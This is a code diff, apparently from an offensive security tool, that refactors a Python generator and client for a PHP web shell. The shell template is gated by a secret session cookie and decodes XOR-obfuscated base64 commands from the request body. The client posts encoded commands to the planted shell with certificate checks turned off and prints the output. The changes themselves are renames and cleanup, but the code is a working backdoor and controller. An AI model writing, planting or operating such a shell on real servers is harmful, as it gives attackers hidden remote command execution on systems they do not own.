@@ -5,7 +5,6 @@ import os
 import random
 import string
 import sys
-import traceback
 
 import requests
 import bcrypt
@@ -19,10 +18,10 @@ def generate_key(seed):
     return key.decode()
 
 
-def generate_shell(key, gen_pkey):
+def generate_shell(key, payload_key):
     shell = [
         "<?php",
-        "$payload_key = '%s';" % gen_pkey,
+        "$payload_key = '%s';" % payload_key,
         'if ($_COOKIE["session"] === "%s") {' % key,
         '  $payload = file_get_contents("php://input");',
         "  $command = base64_decode($payload) ^ $payload_key;",
@@ -90,26 +89,20 @@ def connect(args):
                 payload = make_payload(cmd, payload_key)
                 response = session.post(url, data=payload, verify=False)
                 print(response.text)
-            except (
-                requests.ConnectionError,
-                requests.HTTPError,
-                requests.Timeout,
-            ) as e:
+            except requests.exceptions.RequestException as e:
                 print(e)
 
 
 def generate(args):
     special_chars = '!@#%^&*()-=_+[]{}";:,./<>?'
-    charset = (
-        string.ascii_uppercase + string.ascii_lowercase + string.digits + special_chars
-    )
+    charset = string.ascii_letters + string.digits + special_chars
     seed = "".join(random.choices(charset, k=50))
-    gen_pkey = "".join(random.choices(charset, k=8))
+    payload_key = "".join(random.choices(charset, k=8))
     key = generate_key(seed)
     print(colored("[+] ", "blue") + "Seed: " + seed)
-    print(colored("[+] ", "blue") + "Payload Key: " + gen_pkey)
+    print(colored("[+] ", "blue") + "Payload Key: " + payload_key)
     print(colored("[+] ", "blue") + "Key: %s" % key)
-    generate_shell(key, gen_pkey)
+    generate_shell(key, payload_key)
 
 
 def main(args):
